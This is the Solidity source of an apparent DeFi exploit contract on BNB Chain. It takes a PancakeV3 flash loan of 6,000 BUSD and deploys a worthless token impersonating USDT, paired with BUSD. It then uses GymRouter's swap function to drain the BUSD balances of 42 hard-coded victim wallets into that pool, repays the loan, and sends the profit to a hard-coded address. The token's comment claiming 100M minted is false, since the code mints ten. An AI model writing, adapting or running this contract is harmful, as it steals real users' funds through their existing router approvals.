{"dgo1ddogog.sol":{"content":"import \"./USDT.sol\";\n\ninterface IPancakeV3FlashCallback {\n    function pancakeV3FlashCallback(\n        uint256 fee0,\n        uint256 fee1,\n        bytes calldata data\n    ) external;\n}\n\ninterface IPancakeV3Pool {\n    function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n}\n\ninterface IPancakeRouter02 {\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n    \n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n}\n\ninterface IPancakePair {\n\n    function balanceOf(address owner) external view returns (uint);\n\n    function approve(address spender, uint value) external returns (bool);\n\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n\n}\n\ninterface IGymRouter {\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to\n    ) external;\n\n}\n\ninterface IPancakeFactory {\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\ncontract dgo1ddogog is IPancakeV3FlashCallback {\n    USDT usdt;\n    address goda2q = 0x866bA2dF3389dB45752C87aEED77832BA496232a;\n    address v3pool = 0x4f3126d5DE26413AbDCF6948943FB9D0847d9818;\n    address pancakerouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n    address BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;\n    address GYMRouter = 0x6b869795937DD2B6F4E03d5A0Ffd07A8AD8c095B;\n    address Factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;\n    address newpair;\n\n\n    function dwafawdwa() public {\n        require(msg.sender == goda2q);\n        IPancakeV3Pool(v3pool).flash(address(this), 0, 6000 ether, new bytes(1));\n    }\n\n    function pancakeV3FlashCallback(\n        uint256 fee0,\n        uint256 fee1,\n        bytes calldata data\n    ) external{\n        require(msg.sender == v3pool);\n        usdt = new USDT();\n        newpair = IPancakeFactory(Factory).createPair(address(usdt), BUSD);\n        IPancakeRouter02 pancakeRouter = IPancakeRouter02(pancakerouter);\n        IGymRouter gymrouter = IGymRouter(GYMRouter);\n        usdt.approve(pancakerouter, type(uint256).max);\n        IBEP20 busd = IBEP20(BUSD);\n        busd.approve(pancakerouter, type(uint256).max);\n        IPancakePair(newpair).approve(pancakerouter, type(uint256).max);\n        pancakeRouter.addLiquidity(address(usdt), BUSD, usdt.balanceOf(address(this)), busd.balanceOf(address(this)), 0, 0, address(this), block.timestamp + 10000000000);\n        (uint256  token0,uint256 token1,  ) = IPancakePair(newpair).getReserves();\n        address[] memory path = new address[](2);\n        path[0] = address(BUSD);\n        path[1] = address(usdt);\n        address[42] memory approvedAddress = [0x7821EeF3104C2d6D5D423CC0dEE05EF601C132b5, 0xF74F31E6CF0359Df28D426dC1e3e6Ec6651Dad3a, 0x07c5959906952deDae70077d8A8fDa7829f6F7Cd, 0x7f1F2a4EacD4B30EcFa926fD127eDF06a515DA24, 0xf4DA5D6e58c6Fd8F8a29537035ca24F1E7Bb8e20, 0x6A8aDA78a869B193749A7B97B545C499f90F2b75, 0x1f9fa35ca9C031474B7e45e105bA05a43b63e34E, 0x7fd0B6f1d910d79922dBD7C4072FbA2a229EE4B0, 0xfd0E479DB83D8E5E3D369853e4083c3E2eE7966A, 0xD1ccBE241E2652f858Ba69C0689A7A7E22bc30e6, 0x5B312565228289dcd0a8e96b05cf9C59611BBbA8, 0xc9e1aA474F2F9213000E44aAE1CC2160C92AC895, 0xAf9CE6A0040AbEEAB800D3f8125cf80Ff07ea8EB, 0x3489A307227D0Bc7f6453b28e07f4F2C20862850, 0x8c06E87c463B4113Aa446509D4f1B2649DD1aE38, 0x448eFFfFE21b5238fa625A64649A1fDc8DFA60a0, 0xbdad02678c17Cf91f29D63aB2E3b189063e2BaF9, 0x1F2602Ef720ec758506d3d1C15DbF04e9d779b73, 0x553a5fce908f357D81a5279e95cF373Ea223c334, 0xfa4F166c6C320e80d27eE30b061F7AF9791aFDa8, 0xeebaBD7b863D9DdC498D5CF3426CEFBE848BC5Ef, 0x3066bE43F9cA495c098768767FEfdFE591858f39, 0x4d77F89B8e0C5FECf5389eaE6A3d3D249520437b, 0x493e5F154957DB55598De202E73B5d3C7359822e, 0x1030c0aA9E385AB5E33839208c0C7a066cdF28dF, 0x4E1e67721eeDB776b4397D88abBe554Cc4B83dd4, 0xbA7c9dE0b147DF7c9e5B7e20cd8372b58a59Aa91, 0x876283E0eC0Fc2b6A318Ee6cD252269A4A27c4E5, 0x78E91ccaAB8c8F68257DBD2e09D7B7F292C982FB, 0xd6c382B2624293cEf5A43E30e12cc0e6b3DEd153, 0xdD92E52FC99ddd0357186452c3167cc1073039Ca, 0xA7f28bb080249180e15a7250FC16De8524DD9a13, 0xF4b0d43f135dfedE78E89868Ad9CC98141556cd9, 0x9e4133556d1d534DE50633a2364a3c8304eE538A, 0xA512AC6c5215708D32419E1095F21ed2b72bCa37, 0x5A604e94fC5Bcdb153dB3Ee995bBeE245ec37f51, 0x3BC3Df7c80C01CD33Af7e5f5bdd466e05457Ee22, 0x72f597Fc2168B285c505BcA7121F198Fc3167E97, 0x1eE7d6022ccCE17C64B2644a463977123EfD7088, 0xDF2979518fAAe51ee91dE9818f54EC719E0f6635, 0x7a17a4F4fB623A5140f3d5e070106ed4f8bdE711, 0x712B4CfA3F5F23BfD77Db24fc56412fa1093bD26];\n        for(uint256 i = 0;i \u003c 42; i++)\n        {\n            uint256 outAmount = pancakeRouter.getAmountsOut(1e18, path)[1];\n            \n            uint256 out = (busd.balanceOf(approvedAddress[i]) * outAmount * 90) / 1e20;\n            \n            gymrouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(busd.balanceOf(approvedAddress[i]), out, path, approvedAddress[i]);\n        }\n\n        pancakeRouter.removeLiquidity(address(usdt), BUSD, IPancakePair(newpair).balanceOf(address(this)), 0, 0, address(this), block.timestamp+1000000);\n        busd.transfer(v3pool, 6001 ether);\n        uint256 busdbalancesAfter = busd.balanceOf(address(this));\n        busd.transfer(goda2q, busdbalancesAfter);\n   \n    }\n\n    \n}"},"USDT.sol":{"content":"// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ninterface IBEP20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the token decimals.\n     */\n    function decimals() external view returns (uint8);\n\n    /**\n     * @dev Returns the token symbol.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the token name.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller\u0027s account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address _owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender\u0027s allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller\u0027s\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract BEP20 is IBEP20 {\n\n    mapping(address =\u003e uint256) private _balances;\n\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with\n     * a default value of 18.\n     *\n     * To select a different value for {decimals}, use {_setupDecimals}.\n     *\n     * All three of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n        _decimals = 18;\n    }\n\n    /**\n     * @dev Returns the token name.\n     */\n    function name() public override view returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the token decimals.\n     */\n    function decimals() public override view returns (uint8) {\n        return _decimals;\n    }\n\n    /**\n     * @dev Returns the token symbol.\n     */\n    function symbol() public override view returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev See {BEP20-totalSupply}.\n     */\n    function totalSupply() public override view returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {BEP20-balanceOf}.\n     */\n    function balanceOf(address account) public override view returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {BEP20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `recipient` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {BEP20-allowance}.\n     */\n    function allowance(address owner, address spender) public override view returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {BEP20-approve}.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {BEP20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     * - `sender` and `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     * - the caller must have allowance for `sender`\u0027s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public override returns (bool) {\n        uint256 currentAllowance = _allowances[sender][msg.sender];\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance \u003e= amount, \"BEP20: transfer amount exceeds allowance\");\n            unchecked {\n                _approve(sender, msg.sender, currentAllowance - amount);\n            }\n        }\n\n        _transfer(sender, recipient, amount);\n\n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {BEP20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {BEP20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n        uint256 currentAllowance = _allowances[msg.sender][spender];\n        require(currentAllowance \u003e= subtractedValue, \"BEP20: decreased allowance below zero\");\n        unchecked {\n            _approve(msg.sender, spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    /**\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\n     *\n     * This is internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `sender` cannot be the zero address.\n     * - `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     */\n    function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal {\n        require(sender != address(0), \"BEP20: transfer from the zero address\");\n        require(recipient != address(0), \"BEP20: transfer to the zero address\");\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance \u003e= amount, \"BEP20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[sender] = senderBalance - amount;\n        }\n        _balances[recipient] += amount;\n\n        emit Transfer(sender, recipient, amount);\n    }\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements\n     *\n     * - `to` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal {\n        require(account != address(0), \u0027BEP20: mint to the zero address\u0027);\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal {\n        require(account != address(0), \"BEP20: burn from the zero address\");\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance \u003e= amount, \"BEP20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n        }\n        _totalSupply -= amount;\n\n        emit Transfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\n     *\n     * This is internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal {\n        require(owner != address(0), \u0027BEP20: approve from the zero address\u0027);\n        require(spender != address(0), \u0027BEP20: approve to the zero address\u0027);\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n}\n\ncontract USDT is BEP20 {\n\n    constructor() BEP20(\"USDT\", \"USDT\") {\n        // Mint 100M tokens to creator address\n        _mint(msg.sender, 10 * 10 ** decimals());\n    }\n}"}}